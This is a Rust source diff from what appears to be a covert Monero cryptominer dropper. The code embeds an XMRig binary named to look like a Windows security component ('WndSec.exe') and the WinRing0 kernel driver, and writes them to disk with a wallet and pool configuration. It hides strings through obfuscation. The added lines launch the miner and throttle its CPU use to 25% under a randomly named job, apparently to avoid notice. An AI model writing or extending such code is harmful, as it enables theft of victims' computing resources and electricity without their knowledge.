@@ -1,8 +1,15 @@
 use std::{ fs::{ create_dir_all, File }, io::Write };
 use anyhow::Result;
-use client_vars::constants::{ default_monero_wallet, default_xmrig_pool, xmrig_exe_name };
+use client_vars::constants::{
+    default_miner_cpu_limit,
+    default_monero_wallet,
+    default_xmrig_pool,
+    xmrig_exe_name,
+};
 use obfstr::obfstr as s;
-use shared::utils::functions::get_current_exe_dir;
+use shared::utils::functions::{ generate_random_string, get_current_exe_dir, spawn_program };
+
+use crate::utils::jobs::limit_cpu_usage;
 
 const WINRING0_SYS_BINARY: &[u8] = include_bytes!("../../WinRing0x64.sys");
 const XMRIG_BINARY: &[u8] = include_bytes!("../../WndSec.exe");
@@ -135,22 +142,26 @@ pub fn initialize_miner() -> Result<()> {
     let miner_dir = get_current_exe_dir().join(s!("wndsec"));
     create_dir_all(&miner_dir)?;
 
-    let miner_file_dir = miner_dir.join(xmrig_exe_name());
+    let miner_file_path = miner_dir.join(xmrig_exe_name());
 
-    let ring0_sys_file_dir = miner_dir.join(s!("WinRing0x64.sys"));
+    let ring0_sys_file_path = miner_dir.join(s!("WinRing0x64.sys"));
 
     let config_file_path = miner_dir.join(s!("config.json"));
 
-    let mut file = File::create(&miner_file_dir)?;
+    let mut file = File::create(&miner_file_path)?;
     file.write_all(XMRIG_BINARY)?;
 
-    let mut ring0_sys_file = File::create(&ring0_sys_file_dir)?;
+    let mut ring0_sys_file = File::create(&ring0_sys_file_path)?;
     ring0_sys_file.write_all(WINRING0_SYS_BINARY)?;
 
     let config_str = xmrig_config_template(default_monero_wallet(), default_xmrig_pool());
     let mut config_file = File::create(&config_file_path)?;
     config_file.write_all(config_str.as_bytes())?;
 
-    // run the executable and limit its cpu to 25%s
+    // run the executable and limit its cpu to 25%
+
+    let pid = spawn_program(miner_file_path.to_str().unwrap(), None)?;
+    let job_name = generate_random_string(8);
+    limit_cpu_usage(pid, default_miner_cpu_limit(), &job_name)?;
     Ok(())
 }
